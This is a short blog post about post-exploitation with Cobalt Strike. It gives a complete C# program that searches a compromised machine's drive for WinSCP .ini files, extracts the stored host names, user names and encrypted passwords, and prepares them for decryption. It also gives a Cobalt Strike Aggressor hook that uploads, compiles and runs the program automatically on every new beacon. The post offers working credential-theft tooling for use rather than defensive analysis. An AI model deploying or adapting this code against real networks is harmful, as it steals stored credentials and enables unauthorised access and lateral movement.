---
layout: post
title: Find all WinSCP password in the sea
---

Using cobalt strike to do post-exploitation, it is really amazing to see so much WinSCP password in a single network. Extract it one-by-one is quite slow, wrote a script to extract and decrypt all of them.

```C#
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;

namespace ConsoleApp1
{
    public static class searching
    {
        public static void Main()
        {
            string startFolder = @"C:\";

          
            System.IO.DirectoryInfo dir = new System.IO.DirectoryInfo(startFolder);

            IEnumerable<System.IO.FileInfo> fileList = dir.GetFiles("*.*", System.IO.SearchOption.AllDirectories);

            string searchTerm = @"Password=";

            var queryMatchingFiles =
                from file in fileList
                where file.Extension == ".ini"
                let fileText = GetFileText(file.FullName)
                where fileText.Contains(searchTerm)
                select file.FullName;

            // Execute the query.  
            Console.WriteLine("The term \"{0}\" was found in:", searchTerm);
            foreach (string filename in queryMatchingFiles)
            {
                Console.WriteLine(filename);
                String hostname = null;
                String username = null;
                String password = null;
                foreach (var line in File.ReadAllLines(filename))
                {
                    if (line.StartsWith("HostName="))
                    {
                        hostname = null;
                        username = null;
                        password = null;
                        hostname = line.Split('=')[1];
                    }
                    else if (line.StartsWith("UserName="))
                        username = line.Split('=')[1];
                    else if (line.StartsWith("Password="))
                        password = line.Split('=')[1];

                    if (hostname != null && username != null && password != null)
                    {
                        Console.WriteLine("winscppasswd.exe" + " " + hostname + " " + username + " " + password);
                    }
                }
            }

            // Keep the console window open in debug mode.  
            Console.WriteLine("Press any key to exit");
            Console.ReadKey();
        }

        // Read the contents of the file.  
        static string GetFileText(string name)
        {
            string fileContents = String.Empty;

            if (System.IO.File.Exists(name))
            {
                fileContents = System.IO.File.ReadAllText(name);
            }
            return fileContents;
        }
    }
}
```

To initiate it in CS at start
```
on beacon_initial_empty {
	bmode($1, "dns6");
	bcheckin($1);
	bsleep($1, 1);
	
	bupload($1, "C:\\Users\\user\\Desktop\\search_ini.cs");
	bpowerpick($1, "C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\csc.exe search_ini.cs");
	bpowerpick($1, "search_ini.exe");
}
```
